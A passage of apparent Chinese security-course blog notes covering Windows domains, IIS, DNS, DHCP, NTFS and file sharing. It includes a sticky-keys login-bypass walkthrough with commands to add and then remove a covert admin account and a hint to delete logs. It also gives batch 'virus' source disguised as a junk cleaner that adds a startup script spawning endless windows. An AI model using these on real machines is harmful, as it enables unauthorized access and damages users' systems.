向CA申请证书：\n\n    打开网页：http://10.1.1.2/certsrv 并向CA发送web服务器申请文件\n\n6. CA颁发证书\n7. 在web服务器上下载并完成安装\n8. 在web服务器上启用SSL443\n9. 在客户端上验证","tags":["网络安全"],"categories":["网络安全"]},{"title":"day07 - 域","url":"/2020/08/07/day07-domain/","content":"\n# 1、 域的概述\n\n- Domain 域\n\n- 内网环境：\n    1. 工作组：默认模式，人人平等，不方便管理\n    2. 域       ：人人不平等，集中管理，统一管理\n    \n- 域的特点：\n\n    **集中管理/统一管理**\n    \n    <!-- more -->\n\n# 2、域的组成\n\n- 域控制器：DC（Domain Controller）\n- 成员机\n\n# 3、域的部署\n\n- 安装域控制器--就生成了域环境\n- 安装活动目录--就生成了域控制器\n- 活动目录：Active Directory == AD（DC的**核心**）\n\n# 4、活动目录\n\n- AD\n- 特点：集中管理/统一管理\n\n# 5、部署安装活动目录：\n\n1. 开启2008虚拟机，并桥接到一个VMnet里\n2. 配置静态 IP 地址 10.1.1.1 /24 (指子网掩码24位，即255.255.255.0)\n3. 开始--运行--输入 dcpromo，安装活动目录\n\n    弹出向导：\n\n    勾选DNS  --  新林中新建域  --  域的FQDN（onepiece.com）--  设置林功能级别和域功能级别，可都为2003  --  设置目录还原密码(666.com)  --    勾选安装后重启\n\n4. 在DC登录域  ONEPIECE/administrator，DC的本地管理员自动升级为域管理员，\n5. 检验AD是否安装成功：\n    1. 计算机右键属性  -  查看所属域\n    2. DNS服务器中是否自动创建onepiece.com区域文件\n    及自动注册DC的域名解析记录\n    3. 开始 -- 管理工具 -- AD用户和计算机\n\n         computer：普通域成员机列表\n\n         Domain Controller：DC列表\n\n         users：域账号\n\n# 6、PC加入域\n\n1. 配置IP，并指DNS，且要把ipv6去勾\n2. 计算机右键属性--更改--加入onepiece.com域\n    - DC发来验证，需要有权限加入域的账号密码\n    若用域管理员登录，用户名为administrator,若识别出域，直接写用户名,  若没有则用户名写  onepiece.com\\administrator\n3. 重启加入域后，成功使用域用户登录成员机\n    - 通常用户名例如：路飞 —> fei.lu\n\n常见的小问题\n1）加入域不成功\n    网络是不是不通，IP有没有配好 \n    解析是否成功解析，nslookup 域名\n    是否为DNS缓存问题，ipconfig  /flushdns\n2）登入域不成功\n     如XP，已勾选登录域onepiece，不用再写onepiece.com\\fei.lu\n3）域用户的权限 \n     建议将域用户加入到普通成员机的本地管理员组中\n\n×××本地管理员组：administrators\n×××域管理员组    ：Domain Admins\n\n# 7、组织单位 OU\n\n- 组织单位：OU，Organizational Unit\n- 作用：用于归类域资源（域用户、域计算机、域组）下发组策略\n- 创建：在域管理中右键新建\n\n# 8、组策略 GPO\n\n- GPO：Group Policy\n- 作用：通过组策略可以修改计算机各种属性，如开始菜单、桌面背景、网络参数\n- 组策略在域中，是基于OU下发的\n- 在域中，组策略的应用顺序是 LSDOU\n  LSDOU（策略优先级）Local Site Domain Organizational Unit\n  应用过程中，如果出现冲突，后应用的生效\n\n    ===LSDOU顺序\n    上级OU： 桌面：aa              |        运行：删除\n    下级OU： 桌面：未配置       |        运行：不删除\n\n    =正常情况下：\n    结果     ： 桌面：aa               |       运行：不删除\n\n    =下级OU设置了阻止继承：(只看自己OU的组策略)\n    结果     ：  桌面：未配置       |       运行：不删除\n\n    =上级设置了强制：             (下级组策略只看强制的组策略)\n    结果     ：  桌面：aa              |        运行：删除\n\n    注意：当上级强制和下级阻止继承同时设置，强制生效","tags":["网络安全"],"categories":["网络安全"]},{"title":"day06 - IIS - WEB服务器 | FTP服务器","url":"/2020/08/06/day06-IIS-WEB-FTP/","content":"\n\n# 一、WEB服务器\n\n## 1、WEB服务器概述\n\n- WEB服务器也称为网页服务器，HTTP服务器，WWW万维网服务器等\n\n- 使用协议是HTTP或HTTPS协议    (浏览器专业名称其实是HTTP客户端)\n\n  <!-- more -->\n\n## 2、WEB服务器端口号\n\n- HTTP  : TCP 80\n- HTTPS: TCP 443\n\n## 3、WEB服务器发布软件：\n\n- 微软：IIS（Internet Information Services互联网信息服务)\n(可以发布web网站和FTP站点）\n- linux：Apache /LAMP /Tomcat /nginx 等等\n- 第三方软件：phpstudy、XAMPP      (基于LAMP，仅限学习测试使用)\n\n## 4、部署WEB服务器\n\n1. 配置静态 IP 地址\n2. 安装 IIS-WEB 插件（此时80端口已经打开）\n3. 停用默认站点       （当一个站点都没有时，端口自动关闭）\n4. 新建网站--设置IP地址和端口--指定站点路径--设置权限\n5. 设置默认文档（即设置首页）\n\n## 5、一台服务器同时发布多个WEB站点\n\n- 不同的 IP，相同的端口\n- 相同的 IP，不同的端口（不建议使用1000以下的端口）\n- 相同的 IP，相同的端口，不同的域名（主机头）\n\n    1. 在IIS中新建网站，在IP地址和端口设置时，配置本机IP ，设置主机头为相应域名www.onepiece.com\n    2. 导入网页文件所在文件夹 D:\\onepiece，允许匿名访问，网站新建完成\n    3. 右键属性，在文档选项中，默认文档添加index.html，移至最前\n       此时可以通过 IP 访问网站\n       4.配好DNS服务器，新建区域 onepiece.com，新建主机名称为www\n       此时就可以通过 www.onepiece.com 来访问该网站了\n\n## 6、网站类型\n\n- 静态网站：一般扩展名为 .html 或 htm，无后台数据库（可不是不会动！）\n- 动态网站：一般扩展名为 .asp 或 .php，有后台数据库，asp 或 php 可以连接前台页面与后台数据库\n\n    *默认 IIS 禁用动态网站，需要在WEB服务扩展里打开 Active Server Pages 服务\n\n- 本质区别：动态网站能与用户进行交互（登陆），而静态网站不能\n\n# 二、FTP服务器\n\n## 1、FTP服务器概述\n\n- File Transfer Protocol                 文件传输协议\n\n## 2、FTP端口号\n\n- TCP      20/21\n\n## 3、FTP工作模式\n\n- 主动模式（ PORT ）：服务器主动从 20 端口向客户机传输数据\n- 被动模式（ PASV ）：客户机向服务器发出传输请求，然后服务器从随机生成的端口向客户机传输数据\n\n主被动模式阐述的是数据传输过程\n主被动模式选择权在客户机\n主被动是站在服务器角度来说的\n（主动模式：客户机想让服务器主动）\n\n- 端口的区别：\n\n    20端口：数据传输端口（传输文件的）\n\n    21端口：命令控制端口（传输指令的，比如客户机想要登陆 FTP 就要发送到服务器的 21 端口上）\n\n- FTP传输简要原理/过程：\n    1. 客户机随机开一个端口 50001，向服务器端口 21 发送连接请求，然后进行用户登录\n    2. 当客户机向服务器发送了下载文件的请求时，根据工作模式分为两种情况：\n        - 主动模式：\n\n            客户机随机开一个端口 50002，同时服务器开启 20 端口，并从 20 端口向客户机主动传输文件\n\n            - 若客户机开着防火墙，则服务器无法访问50002端口，那么主动模式没用，只能是被动模式\n        - 被动模式：\n\n            客户机随机开一个端口 50002，同时服务器在本地随机开放一个端口 20001，之后客户机主动向服务器发送传输请求，接到请求之后服务器再开始传输文件（即回包）\n\n            - 若服务器开着防火墙，则客户机无法访问20001端口，那么被动模式没用，只能是主动模式\n- 关于客户机连接异常的解决方法：关闭防火墙，把主被动模式都试一下\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day06.png)\n\n## 4、部署FTP服务器\n\n1. 配置静态 IP\n2. 安装 IIS - ftp软件（此时21端口已经打开）\n3. 使用默认站点或者创建新的站点（当一个站点都没有时，端口自动关闭）\n\n    *注意：用户最终权限为 FTP 权限与 NTFS 权限取交集，与共享权限类似\n\n    **建议：FTP 权限全打勾，在 NTFS 设置具体权限\n\n4. 禁止匿名访问\n- 访问方式：ftp://10.1.1.1 ，输入账号密码","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DNS部署与安全","url":"/2020/08/05/day05-DNS/","content":"\n# 1、DNS\n\n- Domain Name Service\n\n- 域名服务\n\n- 作用：为客户机提供域名解析服务\n\n  <!-- more -->\n\n# 2、域名组成\n\n- 如“www.sina.com.cn” 是一个域名，从严格意义上来说“sina.com.cn”才被称为域名（全球唯一），而“www”是主机名\n\n- “主机名.域名”称为完全限定域名（FQDN,Fully Qualified Domain Name）\n    - 一个域名下可以有多个主机，域名全球唯一，那么“主机名 .域名”肯定也全球唯一\n    - 主机名为服务器标识，如www.sina.com.cn 和mail.sina.com.cn ,就是说 新浪公司有两台DNS服务器，一台的标识为www，一台的标识为mail\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day05.png)\n\n    例:\n    www.baidu.com. \n    这个.默认浏览器自动添加\n    .为根域\n    .com为顶级域\n    baidu为一级域名\n    www为二级域名\n\n    - FQDN = 主机名.DNS后缀\n    - FQDN（完整合格的域名）\n\n# 3、监听端口\n\n- TCP          53\n- UDP         53\n\n# 4、DNS解析种类\n\n- **按照查询方式**\n\n    1.递归查询：客户机与本地 DNS 服务器之间 （DNS服务器转发器也算）\n    （所问既所答，1 和 8）\n\n    2.迭代查询：本地 DNS 服务器与根等其他 DNS 服务器的解析过程\n    （所闻非所答，2—7）\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day05.jpg)\n\n    - DNS解析过程： 客户机想访问 www.baidu.com\n        1. 查找本机缓存\n        2. 若无则找本机 host\n        3. 还没有就向本地 DNS 服务器发出请求\n        4. 本地 DNS 服务器查找 DNS 缓存 和 内置的解析 ，若有则向客户机返回 IP 地址\n        5. 若无则向外查找\n        6. 本地 DNS 服务器向 根域 DNS 服务器发送请求\n        7. 根域 DNS 服务器回应 .com域名服务器 的 IP 地址\n        8. 本地 DNS 服务器向 .com域名服务器 发送请求\n        9. .com域名服务器回应 baidu.com域名服务器 的 IP 地址\n        10. 本地 DNS 服务器向 baidu.com域名服务器 发送请求\n        11. baidu.com域名服务器回应 www.baidu.com 对应的 IP 地址\n        12. 本地 DNS 服务器把收到的 IP 地址返回给客户机，并记下缓存\n        13. 客户机收到地址并记下缓存\n- **按照查询内容分类**\n    1. 正向解析：已知域名，解析IP地址\n    2. 反向解析：已知IP地址，解析域名\n        - nslookup手工解析时，会进行反向解析，显示真实服务器信息\n\n# 5、DNS服务器搭建过程\n\n- 要求网卡 IP 是静态 IP 地址\n- 安装 DNS 服务器插件（也就是安装并开启 TCP 及 UDP 53 端口）\n- 创建区域文件（负责一个域名后缀的解析，如 baidu.com 为域名后缀，一台 DNS 服务器内可以存放多个区域文件）\n- 新建 A 记录 (主机记录)，设置主机名，如www，设置IP\n- **域名解析记录类型：**\n    - A记录：正向解析记录\n    - CNAME记录：别名\n        - 给A记录设置别名，如给www起别名lalala\n        访问lalala.baidu.com，其实就是访问www.baidu.com\n    - PTR记录：反向解析记录\n    - MX：邮件交换记录\n    - NS：域名服务器解析\n\n# ６、DNS客户机解析方法\n\n1. 设置DNS服务器 IP \n2. 手工解析域名：nslookup 域名\n\nnslookup   进入域名解析模式，输入域名就返回IP\nexit            退出该模式\n\n# 7、域名请求的顺序\n\n- 客户机处理DNS请求顺序：DNS缓存--本地hosts文件--找本地DNS服务器\n- 服务器处理DNS请求顺序：DNS高速缓存--本地区域解析文件--转发器--根\n\n# 8、辅助DNS服务器\n\n- 作用：为主 DNS 服务器提供备份，提高安全性，会实时更新\n- 创建过程：\n    1. 在主要 DNS 服务器中，对想要备份的区域右键--属性--区域复制里，勾上”只允许到下列服务器“并把辅助 DNS 服务器的 IP 地址添加上去\n    2. 在辅助 DNS 服务器中，新建区域并选择辅助区域，IP 地址填主要 DNS 服务器即可\n\n# 9、清除DNS缓存\n\n- **客户机清除缓存**\n    - ipconfig /flushdns              清除 DNS 缓存\n    ipconfig /displaydns           查看 DNS 缓存\n    - 清除缓存原因：某网站域名解析若有缓存，第二次解析时直接在本地缓存中找，即使网站的IP 已经更改，解析时仍返回 缓存中的IP\n- **服务器清除缓存**\n    - windows服务器：dns工具--查看--高级，调出缓存，清除缓存\n\n# 10、DNS服务器分类\n\n- 主要名称服务器\n- 辅助名称服务器 == 备份的\n- 根名称服务器     == 全球只有13台\n- 高速缓存名称服务器 == 只保存缓存，不解析\n\n# 11、为DNS主机命名\n\n1. 在正向区域里新建主机记录，设置主机名为dns1，设置IP 为服务器IP\n2. 在反向区域新建 PTR 指针，设置IP为服务器IP，主机名选择之前创建的dns1","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DHCP部署与安全","url":"/2020/08/05/day05-DHCP/","content":"\n# 1、DHCP作用\n\n- DHCP（ Dynamic Host Configure Protocol，动态主机配置协议）\n\n- 自动分配 IP 地址\n\n  <!-- more -->\n\n# 2、DHCP相关概念\n\n- 地址池/作用域：（IP、DNS、子网掩码、网关、租期）\n- DHCP协议端口是UDP 67/68\n\n# 3、DHCP优点\n\n- 减少工作量\n- 避免IP冲突\n- 提高地址利用率\n\n---\n\n# 4、DHCP原理\n\n- 也称为 DHCP 租约过程，分为四个步骤：\n    - **客户机发送 DHCP Discovery 广播包**\n\n         客户机广播请求 IP 地址（包含客户机的 MAC 地址，即物理地址）\n\n    - **服务器响应 DHCP Offer 广播包**\n\n         服务器响应提供的 IP 地址（但无子网掩码、网关等参数）\n\n    - **客户机发送 DHCP Request广播包**\n\n         客户机选择 IP（也可认为确认使用哪个 IP）\n\n    - **服务器发送DHCP ACK广播包**（acknowledge，确认）\n\n         服务器确定了租约，并提供网卡详细参数IP，掩码，网关，DNS，租期等\n\n---\n\n# 5、DHCP续约\n\n- 1)当租期过 50% 的时候，客户机会再次发送 **DHCP Request** 包，进行续约\n2)如果服务器无响应，则继续使用并在 87.5% 时再次发送 **DHCP Request** 包，进行续约\n3)如果仍未响应，则释放 IP 地址\n4)并重新发送 **DHCP Discovery** 包来获取IP地址\n- 当无任何服务器响应时，自动给自己分配一个 169.254.x.x/16，属于全球统一无效地址，用于临时内网通信\n\n# 6、部署DHCP服务器\n\n1. IP 地址固定（服务器必须固定 IP 地址）\n2. 安装DHCP服务插件\n3. 新建作用域及作用域选项，设置网关IP，及DNS服务器IP\n4. 激活\n5. 客户机验证：可以通过网络连接的禁用启用，或者拔插网线，使之连接\n\nipconfig /release \n释放IP         (取消租约，或者改为手动配置IP，也可以释放租约)\n\nipconfig /renew \n重新获取IP（有IP时，发送 Request 包续约，无IP时发送 Discovery 包重新获取IP）\n\n# 7、地址保留\n\n- 对指定的 MAC 地址，固定动态分配 IP 地址\n\n场景：公司有个任性的boss想在 使用自动分配IP 时 获得一个固定的IP(没什么用)\n原理：对指定电脑的MAC地址作保留，今后收到此地址发来的Discovery包时，将指定 IP 分配给他\n\n# 8、选项优先级\n\n- 作用域选项＞服务器选项\n- 当服务器上有多个作用域时，可以在服务器选项设置DNS服务器\n\n# 9、DHCP备份和还原\n\n- 右键服务器可以备份，建议备份到U盘\n- 在电脑损坏时，拿一台新的服务器，配置DHCP，插入U盘，点击还原即可\n\n# 10、DHCP攻击与防御\n\n- 攻击 DHCP 服务器：频繁的发送伪装 DHCP 请求(假MAC)，直到将 DHCP 地址池资源耗尽，导致正常请求无法回应\n\n    防御：在交换机（管理型）的端口上做动态 MAC 地址绑定\n\n- 伪装 DHCP 服务器：hacker 通过将自己部署为 DHCP 服务器，为客户机提供非法IP地址(无法上网)\n\n    防御：在交换机（管理型）除合法的 DHCP 服务器所在接口外，全部设置为禁止发送 DHCP Offer 包","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - NTFS安全权限","url":"/2020/08/04/day04-NTFS/","content":"\n\n# 一、NTFS权限概述\n\n1. 通过设置NTFS，实现不同用户访问不同对象（文件，文件夹）的权限\n\n2. 分配了正确访问权限后，用户才能访问不同的权限\n\n3. 设置权限防止资源被篡改、删除\n\n   <!-- more -->\n\n# 二、文件系统概述\n\n- 文件系统即在外部存储设备上组织文件的方法\n\n    常见的文件系统\n\n    - FAT       windows\n    - NTFS     windows\n    - EXT       linux常见\n\n# 三、NTFS特点 (FAT不具备)\n\n1. 提高磁盘读写性能\n2. 可靠性\n加密文件系统\n访问控制列表（设置权限）ACL: access control list\n3. 磁盘利用率\n压缩\n磁盘配额 －－为不同用户分配空间\n4. 支持单个文件大于4个G\n\n注：16G以下的U盘建议格式化成FAT\n\n# 四、修改NTFS权限\n\n1.　取消继承\n\n作用：取消后，可以任意修改权限列表\n\n方法：文件右键属性－安全－高级－取消第一个对号-选择复制(继承财产)\n\n文件权限|权限内容\n:-:|:-:\n完全控制|拥有读取、写入、修改、删除文件，及特殊权限\n修改|拥有读取、写入、修改、删除文件的权限\n读取和执行|拥有读取，及执行文件的权限\n读取|拥有读取文件的权限\n写入|拥有修改文件内容的权限\n特殊权限|控制文件权限列表的权限\n\n文件夹权限|权限内容\n:-:|:-:\n完全控制|拥有对文件及文件夹读取、写入、修改、删除文件，及特殊权限\n修改|拥有对文件及文件夹读取、写入、修改、删除文件的权限\n读取和执行|拥有对文件夹中的文件下载、读取，及执行文件的权限\n列出文件夹内容 |          可以列出文件夹内容，也就是进得去文件夹          \n读取      |           拥有对文件夹中的文件下载、读取的权限           \n写入      |             拥有在文件夹中创建新的文件的权限             \n特殊权限    |控制文件夹权限列表的权限\n\n2. 权限累加\n\n当用户同时属于多个组，允许权限是可以累加的\n\n案例：用户a同时属于A组和B组，A组可读取，B组可写入，则用户a最终权限是即可读取也可写入\n\n3. 拒绝最大 (即优先)\n\n当用户权限累加时，遇到拒绝权限，拒绝优先，结果就是无法使用该权限\n\n案例：用户a和用户b属于A组，A组拥有读取权限，但单独为用户a设置读取权限的拒绝，那么用户a无法读取，用户b可以读取\n\n4. 取得所有权\n\n默认只有administrator有这个权限 ！\n\n作用：可以将任何文件夹的所有者改为administrator\n\n5. 强制继承\n\n作用：对下(以下文件)强制继承父子关系！\n\n方法：文件夹右键属性－安全－高级－勾上第二个对号即可\n\n使用场景：当一个文件夹内的一些子文件经过修改权限时，想要使所有子文件权限统一于父文件，可以通过此方法将文件夹的权限强制替换掉原来子文件的权限\n\n6. 文件复制剪切对权限的影响\n\n文件复制后，跨分区移动，文件的权限会被目标文件覆盖\n\n文件同分区移动，文件的权限不会被目标文件覆盖","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - 文件共享服务器(Cifs)","url":"/2020/08/04/day04-Cifs/","content":"\ncifs：公司对内偏多 (微软开发,所有windows系统都有,适合win系)\nftp ：对外偏多\n\n<!-- more -->\n\n# 一、文件共享服务器概述\n\n- 通过网络提供文件共享服务，提供文件下载和上传服务（类似于FTP服务器）\n\n# 二、创建共享\n\n- 方法:文件夹右键属性－共享－开启共享－设置共享名－设置共享权限\n- 注：\n\n    1）在本地登录时，只受NTFS权限的影响\n    2）在远程登录时，将受共享及NTFS权限的共同影响，且最终权限取交集。\n    3）所以建议设置共享权限为everyone完全控制，然后具体的权限在NTFS中设置即可。\n\n# 三、访问共享\n\n- 在开始运行或我的电脑地址栏中，输入 UNC 地址：\n\\\\文件共享服务器IP\n\\\\文件共享服务器IP\\共享名  (与共享文件在服务器的路径位置无关)\n- 第一次访问需要服务器上一个账户,共享前,服务器可以新建一个临时用户\n再次访问会直接登录,若要换账号登录,自己电脑注销重进就可以\n\n# 四、隐藏共享与访问方法\n\n- 在分享时将分享名后面加上 $ 符号，如 share$\n- 在访问使需要知道该共享名 share$ 才能访问\n手动输入  \\\\文件共享服务器IP\\共享名  ，如\\\\10.1.1.2\\share$\n\n# 五、相关共享DOS命令\n\n- net share                                  #列出共享列表\n- net share 共享名=共享路径    #创建共享，如 net share c$=c:\\\n- net share 共享名 /del              #删除共享文件\n\n# 六、屏蔽系统隐藏共享自动产生\n\n- **打开注册表**\n\n    打开注册表编辑器：regedit\n\n- **定位共享注册表位置**\n\n    位置：（可百度自查）\n\n    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Service\\lanmanserver\\parameters\n\n    在该位置新建 REG_DWORD 类型的 AutoShareServer ，并将值设为 0\n\n# 七、查看本地网络连接状态\n\n         netstat -an （查端口，是否开放）\n\n# 八、关闭445服务\n\n可以通过关闭445端口来屏蔽病毒传入（如勒索病毒等）\n\n- 方法1：打开 services.msc，停止并禁用 server 服务，且把恢复一栏都改为不操作\n- 方法2：禁止被访问445，配置高级安全防火墙--入站规则（win7及以上系统，win2008及以上系统）\n\n常见端口：\n    3389                        *#远程桌面*\n    23                            *#telnet*\n    445                          *#共享服务*","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 破解系统密码","url":"/2020/08/03/day03-Crack-system-password/","content":"\n\n# 一、利用5次shift漏洞破解win7密码\n\n1. 漏洞\n    - 漏洞1：未登陆系统前连按5次shift弹出程序（粘滞键）\n      程序位置：c:\\windows\\system32\\sethc.exe\n    \n    - 漏洞2：部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名！\n\n    - 注：如果win7或win10已修补此漏洞2，则无法利用\n\n    <!-- more -->\n    \n    ---\n    \n2. 破解过程相关知识\n    - cmd工具路径                   c:\\windows\\system32\\cmd\n    - 用户/账户密码存储位置   c:\\windows\\system32\\config\\SAM\n    - 修改账户密码                   net  user 用户名 新密码\n\n    ---\n\n3. 漏洞利用过程\n- 案例：破解win7系统密码\n  - 实验步骤：\n  1. 开启win7虚拟机，开机，随便设置一个密码\n     可用 net user Barry sad#adhk&*hkadb13asd45 设置\n\n  2. 关机后开机，进入登录页面，鼠标进入虚拟机，连按 shift 5次，弹出对话框，说明存在 漏洞1：5次shift漏洞 \n\n    该程序的位置：c:\\windows\\system32\\sethc.exe（突破口：将其替换）\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(0).png)\n\n  3. 若存在漏洞，则关机再开机，在出现windows启动界面(四个小点汇聚成旗)时，强制关机(把虚拟机电源拔了，虚拟机右键选择电源—关闭客户机)\n\n  4. 再开机，如果没有出现以下界面，再强制关机一次\n      （win7 一般两次，win10 一般三次）\n      选择启动修复（漏洞在此哦）\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(1).png)\n  进入 “ 启动修复 ” 界面\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(2).png)\n\n\n  5. 出现系统还原提示，点击取消，然后它继续尝试修复，等待几分钟\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(3).png)\n\n      出现问题原因，如以下界面，点击查看详细信息\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(4).png)\n\n  6. 在详细信息中，点击最后一个 txt 文档 的链接，进入记事本\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(5).png)\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(6).png)\n\n      选择文件 — 另存为 (或打开)，进入以下界面，此时就是在最高权限下查看所有文件\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(7).png)\n\n ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(8).png)\n\n\n  1. 接下来去寻找 5次shift启动的粘滞键程序\n      - 位置： c:\\windows\\system32\\sethc.exe    \n      将其替换为cmd程序\n      - 位置： c:\\windows\\system32\\cmd\n      注：此时我们要找的C盘在system权限下其实是D盘\n      - 进入D盘，进入windows中的system32中，选择显示所有文件\n      找到 sethc  ，将其重命名（任意），如sethc-bak\n      找到 cmd   ，复制一份cmd，改名为sethc\n      此时基本已经成功，再次开机使调用sechc时就是调用cmd了\n\n      ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(9).png)\n\n  ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-2(10).png)\n\n  8. 全部关闭，重新启动，回到登录界面\n     \n      连按5次shift ，cmd窗口就被调用出来了\n      接下来可以为所欲为了，要想进入有以下两种方法\n        - 若想修改该用户的密码：\n          net user 用户名  新密码\n          用户名在登录界面可以看到，若不想设密码，可以输入“”，置空\n        - 若不想修改该用户的密码：\n          net user test 123 /add                               #新建用户，设置密码\n          net localgroup administrators test /add   #升权为管理员\n          做完该做的事之后......\n          net user test /del                                      #删除用户，擦除数据\n          注：还需删除日志，今后会提到，此处暂未提及\n\n# 二、利用PE破解系统密码\n\n- Windows PE：Windows Preinstallation Environment，Windows预安装环境，是带有有限服务的最小Win32子系统，基于以保护模式运行的Windows XP Professional及以上内核。\n- 功能：包括运行Windows安装程序及脚本、连接网络共享、自动化基本过程以及执行硬件验证所需的最小功能\n- 使用极其简单：\n    - 下一个PE工具，插入U盘，将系统装入，开启目标系统电脑，在刚开机使按相应方法进入BIOS界面(Basic Input Output System,基本输入输出系统)\n        - 真实机一般狂摁某个按键，如Esc，F1等\n        - 虚拟机，进入下拉菜单，点击 打开电源时进入固件\n    - 到BOOT页面下选择U盘或是光驱启动，F10保存，退出BIOS，进入PE系统，点击 破解Windows登录密码\n    - 软件自动定位到C:\\WINDOWS\\SYSTEM32\\CONFIG\\SAM\n    打开后选择用户，更改口令，输入新密码，若不输入，则不设密码\n    保存更改，破解成功\n\n原理：SAM保存着所有用户的账号和密码hash值，我们要做的就是进入SAM文件，用 我们要设置的新密码的hash值 替换 针对账号的密码hash值","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 批处理与病毒","url":"/2020/08/03/day03-bat&virus/","content":"\n\n- 批处理作用：自上而下成批处理每一条DOS命令，直到执行到最后一条。\n\n# 如何创建批处理：\n\n- 扩展名：.bat\n- 创建方法：创建一个记事本文件，然后将其扩展改为.bat\n- 运行环境：cmd  (cmd.exe)\n\n<!-- more -->\n\n# **基本命令**\n\n- echo：输出信息\n\n    > @echo off：关闭回显（屏蔽执行过程）只显示结果\n     echo.       ：输出空行\n\n---\n\n- pause：暂停批处理运行\n- cls     ：清屏\n\n---\n\n- color <颜色代码> ：\n改dos界面颜色，背景色+文字颜色，如0a\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(1).png)\n\n- title <标题内容>                 ：给批处理脚本设置标题\n\n---\n\n- > nul(：隐藏结果) 2> nul  (：隐藏错误信息)\n\n---\n\n- md 路径+文件名                ：建立目录\n\n---\n\n- rd  (参数) 文件路径             ：删除目录\n  #参数 /s 除目录本身外还删除其下的所有子目录和文件参数 \n  /q 安静模式，带 /s 删除目录树时不要求确认\n\n---\n\n- cd 路径                                ：进入目录\n# cd\\ 回到根目录   |    cd.. 回到上级目录\n\n---\n\n- goto <区块名>：跳转到一个命令区块继续运行\n#用 :<区块名> 来声明一个区块例如： :7749 就声明了一个名为 7749 的区块\n\n---\n\n- set (可选参数) <变量名> = 变量值\n#参数 /p , 程序暂停等待用户输入，变量的值就等于用户输入\n例如：set /p a = 请输入变量 a 的值：，不加 /p 的话就是直接赋值\n- %<变量名>% ,如%u%          #引用变量，提取变量的值\n- 典例\n\n    ```jsx\n    @echo off         \n    color 0a             \n    title 批处理小程序v1.0     \n     \n    :menu\n    cls\n    echo ==========================\n    echo               菜单\n    echo         1、修改管理员密码\n    echo         2、定时关机\n    echo         3、查看本机IP\n    echo         4、退出本程序\n    echo ===========================\n     \n    set /p num=请输入选项：   \n    if \"%num%\"==\"1\" goto 1\n    if \"%num%\"==\"2\" goto 2\n    if \"%num%\"==\"3\" goto 3\n    if \"%num%\"==\"4\" goto 4\n    echo 请正确输入数值，按任意键继续！\n    pause\n    goto menu\n     \n    :1\n    set /p u=请输入用户名:\n    set /p p=请输入新密码:\n    net user %u% %p%   >nul  \n    echo 您的密码已经设置成功!按任意键返回菜单!\n    pause\n    goto menu\n    #注解：net user 用户名 密码 #修改账户密码（windows所有平台支持）\n           >nul     #清除系统反馈，如命令成功完成...\n    :2\n    set /p time=请输入时间：\n    shutdown -s -t %time%  \n    set /p x=是否取消（Y：是，N：否）：\n    if \"%x%\"==\"Y\" shutdown -a\n    echo 执行完毕，按任意键返回菜单!\n    pause\n    goto menu\n    \n    :3\n    ipconfig\n    echo 按任意键返回菜单!\n    pause\n    goto menu\n    \n    :4\n    exit\n    ```\n\n---\n\n## 简单病毒\n\n- 批处理文件一\n\n    功能：伪装垃圾清理程序，添加到开机自启，无限弹出cmd窗口\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(2).png)\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========\n    echo.\n    echo.\n    echo :a>c:\\windows\\zuosi.bat\n    echo start>>c:\\windows\\zuosi.bat\n    echo goto a>>c:\\windows\\zuosi.bat\n    copy c:\\windows\\zuosi.bat \"%USERPROFILE%\\「开始」菜单\\程序\\启动\" >nul\n    #此处的系统启动菜单为win 2003下的，不同系统有所不同\n    echo.\n    echo   ====== 垃圾清理中，请不要关闭窗口======\n    echo.\n    ping -n 5 127.0.0.1 >nul  #运行几秒，骗过用户\n    echo.\n    echo   ====== 垃圾清理完毕，共清理垃圾500M===\n    echo.\n    echo.\n    echo   ====== 建议立即重启电脑\n    echo   按任意键关闭！\n    pause\n    exit\n    ```\n\n---\n\n- 批处理文件二（纯恶搞）\n\n    功能：伪装垃圾清理程序 强制终止桌面进程\n\n    - taskkill /im explorer.exe /f >nul 2>nul\n    - taskkill：杀死进程   |   /im 进程名：指定杀死哪个进程    |   /f ：强制\n\n    ```jsx\n    @echo off\n    title 系统垃圾清理\n    color 2f\n    echo ====== 若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====\n    echo.\n    echo.\n    echo ====== 垃圾清理中，请不要关闭窗口=======\n    echo.\n    ping -n 5 127.0.0.1 >nul\n    taskkill /im explorer.exe /f >nul 2>nul\n    echo.\n    echo. ===== 完了，你系统废了======\n    ping -n 5 127.0.0.1>nul\n    echo.\n    start c:\\windows\\explorer.exe           #打开进程\n    echo.\n    echo ====== 已经修复好了！是不是吓坏了！！嘿嘿=========\n    pause\n    ```\n\n---\n\n- 简易蓝屏炸弹 